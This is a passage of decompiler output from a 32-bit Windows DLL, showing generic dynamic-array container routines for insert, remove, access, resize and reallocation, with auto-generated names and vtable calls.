    v3 = (void (__thiscall ***)(_DWORD, int))this[3];
    if ( v3 )
    {
      if ( *(v3 - 1) )
        (**v3)(v3, 3);
      else
        j__free(v3 - 1);
    }
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (100068A5) --------------------------------------------------------
void *__thiscall sub_100068A5(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_100FBF60;
  v5 = 1;
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j__free(v2 - 1);
  }
  this[3] = 0;
  v5 = -1;
  return sub_100059B5(this);
}
// 100FBF60: using guessed type int (__thiscall *off_100FBF60)(void *Block, char);

//----- (10006917) --------------------------------------------------------
void __thiscall sub_10006917(_DWORD *this, int a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // edi
  int v7; // eax
  int v8; // [esp+Ch] [ebp-14h] BYREF
  LONG v9; // [esp+10h] [ebp-10h] BYREF
  int v10; // [esp+1Ch] [ebp-4h]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_101441C3);
  sub_1000D372(&v8, a2);
  v10 = 0;
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ; --i )
  {
    v7 = this[3];
    if ( i <= a3 )
      break;
    sub_10001236((LONG *)(v7 + 8 * i - 4), (LONG *)(v7 + 8 * i + 4));
  }
  sub_10001236(&v9, (LONG *)(v7 + 8 * a3 + 4));
  ++this[1];
  v10 = -1;
  sub_1000D3AD(&v8);
}

//----- (100069AE) --------------------------------------------------------
int __thiscall sub_100069AE(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi
  int v4; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1014424A);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    sub_10001236((LONG *)(this[3] + 8 * v2 + 12), (LONG *)(this[3] + 8 * v2 + 4));
    ++v2;
  }
  v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_10001236(&dword_10193B40, (LONG *)(this[3] + 8 * v4 + 4));
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 10193B40: using guessed type LONG dword_10193B40;

//----- (10006A09) --------------------------------------------------------
int __thiscall sub_10006A09(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1014424B);
  return this[3] + 8 * a2;
}

//----- (10006A27) --------------------------------------------------------
int __thiscall sub_10006A27(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10144352);
  return this[3] + 8 * a2;
}

//----- (10006A45) --------------------------------------------------------
void __thiscall sub_10006A45(_DWORD *this, unsigned int a2)
{
  void (__thiscall ***v2)(_DWORD, int); // esi

  if ( this[2] < a2 )
  {
    v2 = (void (__thiscall ***)(_DWORD, int))this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void (__thiscall ***)(_DWORD, int), unsigned int))(*this + 84))(
      this,
      this[1],
      v2,
      a2);
    if ( v2 )
    {
      if ( *(v2 - 1) )
        (**v2)(v2, 3);
      else
        j__free(v2 - 1);
    }
  }
}

//----- (10006A7D) --------------------------------------------------------
int __thiscall sub_10006A7D(int *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  int v3; // edx
  int result; // eax

  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j__free(v2 - 1);
  }
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10006AB6) --------------------------------------------------------
int __thiscall sub_10006AB6(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    sub_10001236(&dword_10193B40, (LONG *)(this[3] + 8 * i + 4));
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}
// 10193B40: using guessed type LONG dword_10193B40;

//----- (10006AFF) --------------------------------------------------------
unsigned int __thiscall sub_10006AFF(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10144353);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (10006B71) --------------------------------------------------------
unsigned int __thiscall sub_10006B71(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // edi
  unsigned int result; // eax
  LONG *v12; // ebx

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 29 != 0 ? -1 : 8 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(
      v7 + 1,
      8u,
      v5,
      (void (__thiscall *)(void *))sub_10007E15,
      (void (__thiscall *)(void *))sub_1000D3AD);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    v12 = (LONG *)(a3 + 4);
    do
    {
      sub_10001236(v12, (LONG *)(this[3] + 8 * v10++ + 4));
      v12 += 2;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}

//----- (10006C23) --------------------------------------------------------
void *__thiscall sub_10006C23(_DWORD *this)
{
  void *result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // edi
  int v6; // eax
  char *v7; // edi
  int v8; // ecx
  int *v9; // eax
  _DWORD *v10; // ebx
  char *v11; // eax
  LONG *v12; // edi
  char *v13; // [esp+Ch] [ebp-18h]
  unsigned int v14; // [esp+10h] [ebp-14h]
  int v15; // [esp+14h] [ebp-10h]

  result = &loc_100A3A0A;
  if ( this[2] > 0x10u )
  {
    result = (void *)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
    if ( (unsigned int)result <= this[2] )
    {
      v3 = *this;
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v3 + 80))(this, 1, v4) <= 0x10 )
      {
        v15 = 16;
      }
      else
      {
        v5 = *this;
        v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
        v15 = (*(int (__thiscall **)(_DWORD *, int, int))(v5 + 80))(this, 1, v6);
      }
      v7 = (char *)this[3];
      v13 = v7;
      v8 = (unsigned __int64)(unsigned int)v15 >> 29 != 0 ? -1 : 8 * v15;
      v9 = (int *)operator new(__CFADD__(v8, 4) ? -1 : v8 + 4);
      if ( v9 )
      {
        *v9 = v15;
        v10 = v9 + 1;
        `eh vector constructor iterator'(
          v9 + 1,
          8u,
          v15,
          (void (__thiscall *)(void *))sub_10007E15,
          (void (__thiscall *)(void *))sub_1000D3AD);
      }
      else
      {
        v10 = 0;
      }
      v14 = 0;
      if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
      {
        v11 = (char *)(v7 - (char *)v10);
        v12 = v10 + 1;
        while ( 1 )
        {
          sub_10001236((LONG *)&v11[(_DWORD)v12], v12);
          ++v14;
          v12 += 2;
          if ( v14 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
            break;
          v11 = (char *)(v13 - (char *)v10);
        }
        v7 = v13;
      }
      this[3] = v10;
      if ( v7 )
      {
        if ( *((_DWORD *)v7 - 1) )
          (**(void (__thiscall ***)(char *, int))v7)(v7, 3);
        else
          j__free(v7 - 4);
      }
      result = (void *)v15;
      this[2] = v15;
    }
  }
  return result;
}

//----- (10006D46) --------------------------------------------------------
_DWORD *__stdcall sub_10006D46(_DWORD *a1)
{
  *a1 = off_100FBF5C;
  *a1 = &off_100FBFC0;
  sub_1000815F(a1);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 100FBFC0: using guessed type int (__thiscall *off_100FBFC0)(void *Block, char);

//----- (10006D81) --------------------------------------------------------
int *__thiscall sub_10006D81(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_10007E3D(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (10006DC3) --------------------------------------------------------
void *__thiscall sub_10006DC3(_DWORD *this)
{
  char *v2; // eax
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_100FBFC0;
  v5 = 1;
  v2 = (char *)this[3];
  if ( v2 )
    sub_10007E3D(v2);
  this[3] = 0;
  v5 = -1;
  return sub_100059B5(this);
}
// 100FBFC0: using guessed type int (__thiscall *off_100FBFC0)(void *Block, char);

//----- (10006E24) --------------------------------------------------------
void __thiscall sub_10006E24(_DWORD *this, int a2, unsigned int a3)
{
  int v4; // esi
  int v5; // eax
  unsigned int v6; // eax
  int v7; // ebx
  int v8[2]; // [esp+8h] [ebp-2Ch] BYREF
  int v9; // [esp+10h] [ebp-24h] BYREF
  int v10[4]; // [esp+18h] [ebp-1Ch] BYREF
  int v11; // [esp+30h] [ebp-4h]
  int v12; // [esp+3Ch] [ebp+8h]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_101443D6);
  sub_1000D372(v8, a2);
  v11 = 0;
  sub_1000D372(&v9, a2 + 8);
  LOBYTE(v11) = 1;
  sub_1000809E((_DWORD *)(a2 + 16), v10);
  v11 = 3;
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( v6 > a3 )
  {
    v7 = 32 * v6;
    v12 = v6 - a3;
    do
    {
      sub_10007E5B(this[3] + v7 - 32, (LONG *)(this[3] + v7));
      v7 -= 32;
      --v12;
    }
    while ( v12 );
  }
  sub_10007E5B((int)v8, (LONG *)(this[3] + 32 * a3));
  ++this[1];
  v11 = -1;
  sub_10003111(v8);
}
// 10006E24: using guessed type int var_1C[4];

//----- (10006EF0) --------------------------------------------------------
int __thiscall sub_10006EF0(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  unsigned int v4; // ebp
  int v5; // ebx
  int v6; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_101443D7);
  v3 = *this;
  --this[1];
  v4 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(v3 + 4))(this) )
  {
    v5 = 32 * a2;
    do
    {
      sub_10007E5B(this[3] + v5 + 32, (LONG *)(this[3] + v5));
      ++v4;
      v5 += 32;
    }
    while ( v4 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_10007E5B((int)&unk_10193B54, (LONG *)(this[3] + 32 * v6));
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (10006F5E) --------------------------------------------------------
int __thiscall sub_10006F5E(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1014442A);
  return this[3] + 32 * a2;
}

//----- (10006F7D) --------------------------------------------------------
int __thiscall sub_10006F7D(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1014442B);
  return this[3] + 32 * a2;
}

//----- (10006F9C) --------------------------------------------------------
char *__thiscall sub_10006F9C(_DWORD *this, char *a2)
{
  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_10007E3D(v3);
  }
  return result;
}

//----- (10006FC2) --------------------------------------------------------
int __thiscall sub_10006FC2(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_10007E3D(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10006FE9) --------------------------------------------------------
int __thiscall sub_10006FE9(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebp
  int v4; // ebx
  int v5; // eax

  v2 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = 32 * a2;
    do
    {
      sub_10007E5B((int)&unk_10193B54, (LONG *)(v4 + this[3]));
      ++a2;
      v4 += 32;
    }
    while ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, v2);
  v5 = *this;
  this[1] = v2;
  return (*(int (__thiscall **)(_DWORD *))(v5 + 88))(this);
}

//----- (10007041) --------------------------------------------------------
unsigned int __thiscall sub_10007041(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_101444EE);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v11 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
      (*(void (__thiscall **)(int *, int))(v8 + 36))(v9, v10 + this[3]);
      ++v11;
      v10 += 32;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (100070BD) --------------------------------------------------------
unsigned int __stdcall sub_100070BD(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (100070CE) --------------------------------------------------------
unsigned int __thiscall sub_100070CE(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // esi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int result; // eax
  int v11; // ebx
  char *Blocka; // [esp+28h] [ebp+10h]

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 27 != 0 ? -1 : 32 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(
      v7 + 1,
      0x20u,
      v5,
      (void (__thiscall *)(void *))sub_100030C4,
      (void (__thiscall *)(void *))sub_10003111);
  }
  Blocka = 0;
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    v11 = 0;
    do
    {
      sub_10007E5B(v11 + a3, (LONG *)(v11 + this[3]));
      ++Blocka;
      v11 += 32;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( (unsigned int)Blocka < result );
  }
  return result;
}

//----- (10007182) --------------------------------------------------------
void *__thiscall sub_10007182(_DWORD *this)
{
  void *result; // eax
  int v3; // esi
  int v4; // eax
  int v5; // esi
  int v6; // eax
  int v7; // ecx
  int *v8; // eax
  LONG *v9; // esi
  LONG *v10; // esi
  char *v11; // [esp+8h] [ebp-1Ch]
  int v12; // [esp+Ch] [ebp-18h]
  char *Block; // [esp+10h] [ebp-14h]
  LONG *v14; // [esp+14h] [ebp-10h]

  result = &loc_100A63E5;
  if ( this[2] > 0x10u )
  {
    result = (void *)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
    if ( (unsigned int)result <= this[2] )
    {
      v3 = *this;
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v3 + 80))(this, 1, v4) <= 0x10 )
      {
        v12 = 16;
      }
      else
      {
        v5 = *this;
        v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
        v12 = (*(int (__thiscall **)(_DWORD *, int, int))(v5 + 80))(this, 1, v6);
      }
      v11 = (char *)this[3];
      v7 = (unsigned __int64)(unsigned int)v12 >> 27 != 0 ? -1 : 32 * v12;
      v8 = (int *)operator new(__CFADD__(v7, 4) ? -1 : v7 + 4);
      if ( v8 )
      {
        v9 = v8 + 1;
        *v8 = v12;
        `eh vector constructor iterator'(
          v8 + 1,
          0x20u,
          v12,
          (void (__thiscall *)(void *))sub_100030C4,
          (void (__thiscall *)(void *))sub_10003111);
        v14 = v9;
      }
      else
      {
        v14 = 0;
      }
      Block = 0;
      if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
      {
        v10 = v14;
        do
        {
          sub_10007E5B((int)v10 + v11 - (char *)v14, v10);
          ++Block;
          v10 += 8;
        }
        while ( (unsigned int)Block < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
      }
      this[3] = v14;
      if ( v11 )
        sub_10007E3D(v11);
      result = (void *)v12;
      this[2] = v12;
    }
  }
  return result;
}

//----- (1000728E) --------------------------------------------------------
_DWORD *__userpurge sub_1000728E@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (100072D2) --------------------------------------------------------
_DWORD *__stdcall sub_100072D2(_DWORD *a1)
{
  *a1 = off_100FBF5C;
  *a1 = &off_100FC0F8;
  sub_100081F9(a1);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 100FC0F8: using guessed type int (__thiscall *off_100FC0F8)(void *Block, char);

//----- (1000730D) --------------------------------------------------------
void *__thiscall sub_1000730D(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_100FC0F8;
  v5 = 1;
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j__free(v2 - 1);
  }
  this[3] = 0;
  v5 = -1;
  return sub_100059B5(this);
}
// 100FC0F8: using guessed type int (__thiscall *off_100FC0F8)(void *Block, char);

//----- (1000737F) --------------------------------------------------------
void __thiscall sub_1000737F(_DWORD *this, int a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int v6; // eax
  int v7; // edi
  int v8; // [esp+10h] [ebp-24h]
  int v9[5]; // [esp+14h] [ebp-20h] BYREF
  int v10; // [esp+30h] [ebp-4h]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_10144D02);
  v10 = 1;
  v9[0] = (int)&off_100FC0B8;
  memset(&v9[1], 0, 12);
  sub_10009DE4(a2, (int)v9);
  v10 = 2;
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( v6 > a3 )
  {
    v7 = 16 * v6;
    v8 = v6 - a3;
    do
    {
      (*(void (__stdcall **)(int))(*(_DWORD *)(this[3] + v7) + 56))(this[3] + v7 - 16);
      v7 -= 16;
      --v8;
    }
    while ( v8 );
  }
  (*(void (__thiscall **)(unsigned int, int *))(*(_DWORD *)(16 * a3 + this[3]) + 56))(16 * a3 + this[3], v9);
  ++this[1];
  v10 = -1;
  sub_100057B7(v9);
}
// 100FC0B8: using guessed type int (__thiscall *off_100FC0B8)(void *, char);

//----- (10007469) --------------------------------------------------------
int __thiscall sub_10007469(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (10007481) --------------------------------------------------------
int __thiscall sub_10007481(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  unsigned int v4; // ebx
  int v5; // edi
  int v6; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10144D03);
  v3 = *this;
  --this[1];
  v4 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(v3 + 4))(this) )
  {
    v5 = 16 * a2;
    do
    {
      (*(void (__stdcall **)(int))(*(_DWORD *)(this[3] + v5) + 56))(this[3] + v5 + 16);
      ++v4;
      v5 += 16;
    }
    while ( v4 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(int, void *))(*(_DWORD *)(16 * v6 + this[3]) + 56))(16 * v6 + this[3], &unk_10193B44);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (100074EC) --------------------------------------------------------
int __thiscall sub_100074EC(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10144D3E);
  return this[3] + 16 * a2;
}

//----- (1000750B) --------------------------------------------------------
int __thiscall sub_1000750B(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10144D3F);
  return this[3] + 16 * a2;
}

//----- (1000752A) --------------------------------------------------------
int __thiscall sub_1000752A(_DWORD *this, unsigned int a2)
{
  unsigned int v3; // ebp
  int v4; // edi
  int v5; // eax

  v3 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = 16 * a2;
    do
    {
      (*(void (__thiscall **)(int, void *))(*(_DWORD *)(this[3] + v4) + 56))(this[3] + v4, &unk_10193B44);
      ++v3;
      v4 += 16;
    }
    while ( v3 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v5 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v5 + 88))(this);
}

//----- (1000757C) --------------------------------------------------------
unsigned int __thiscall sub_1000757C(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10144D8E);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v11 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
      (*(void (__thiscall **)(int *, int))(v8 + 36))(v9, v10 + this[3]);
      ++v11;
      v10 += 16;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (100075F8) --------------------------------------------------------
unsigned int __thiscall sub_100075F8(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax
  int v12; // edi

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 28 != 0 ? -1 : 16 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(
      v7 + 1,
      0x10u,
      v5,
      (void (__thiscall *)(void *))sub_100066C2,
      (void (__thiscall *)(void *))sub_100057B7);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    v12 = 0;
    do
    {
      (*(void (__thiscall **)(int, int))(*(_DWORD *)(this[3] + v12) + 56))(this[3] + v12, v12 + a3);
      ++v10;
      v12 += 16;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}

//----- (100076A9) --------------------------------------------------------
void *__thiscall sub_100076A9(_DWORD *this)
{
  void *result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // edi
  int v6; // eax
  char *v7; // ebx
  int v8; // ecx
  int *v9; // eax
  char *v10; // edi
  char *v11; // edi
  char *i; // eax
  unsigned int v13; // [esp+Ch] [ebp-18h]
  int v14; // [esp+10h] [ebp-14h]
  char *v15; // [esp+14h] [ebp-10h]

  result = &loc_100A3A0A;
  if ( this[2] > 0x10u )
  {
    result = (void *)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
    if ( (unsigned int)result <= this[2] )
    {
      v3 = *this;
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v3 + 80))(this, 1, v4) <= 0x10 )
      {
        v14 = 16;
      }
      else
      {
        v5 = *this;
        v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
        v14 = (*(int (__thiscall **)(_DWORD *, int, int))(v5 + 80))(this, 1, v6);
      }
      v7 = (char *)this[3];
      v8 = (unsigned __int64)(unsigned int)v14 >> 28 != 0 ? -1 : 16 * v14;
      v9 = (int *)operator new(__CFADD__(v8, 4) ? -1 : v8 + 4);
      if ( v9 )
      {
        v10 = (char *)(v9 + 1);
        *v9 = v14;
        `eh vector constructor iterator'(
          v9 + 1,
          0x10u,
          v14,
          (void (__thiscall *)(void *))sub_100066C2,
          (void (__thiscall *)(void *))sub_100057B7);
        v15 = v10;
      }
      else
      {
        v15 = 0;
      }
      v13 = 0;
      if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
      {
        v11 = v15;
        for ( i = (char *)(v7 - v15); ; i = (char *)(v7 - v15) )
        {
          (*(void (__thiscall **)(char *, char *))(*(_DWORD *)v11 + 56))(v11, &i[(_DWORD)v11]);
          ++v13;
          v11 += 16;
          if ( v13 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
            break;
        }
      }
      this[3] = v15;
